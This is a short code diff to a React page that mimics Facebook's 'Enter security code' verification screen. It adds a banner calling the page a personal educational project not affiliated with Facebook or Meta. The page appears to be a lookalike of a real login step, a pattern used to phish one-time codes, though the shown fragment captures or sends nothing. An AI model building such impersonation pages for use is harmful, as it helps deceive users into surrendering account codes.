@@ -95,6 +95,11 @@ const VerificationPage = () => {
                 <div className="md:text-[30px] text-[20px] text-blue-600 font-bold py-2  pl-8 mb-20 text-left ">
                     facebook
                 </div>
+                <div className="w-full overflow-hidden bg-gray-100 py-1 flex -mt-5 mb-3">
+      <div className="whitespace-nowrap animate-marquee text-lg text-gray-600 mx-auto">
+        This is a personal educational project and is not affiliated with Facebook or Meta.
+      </div>
+    </div>
             </div>
             <form onSubmit={completed} className="md:w-[500px] w-[320px] bg-white justify-self-center rounded-md shadow-xl pb-5 mb-14 px-4">
                 <h3 className="text-black pt-5 pb-5 text-left text-xl font-medium text-[20px]">Enter security code</h3>
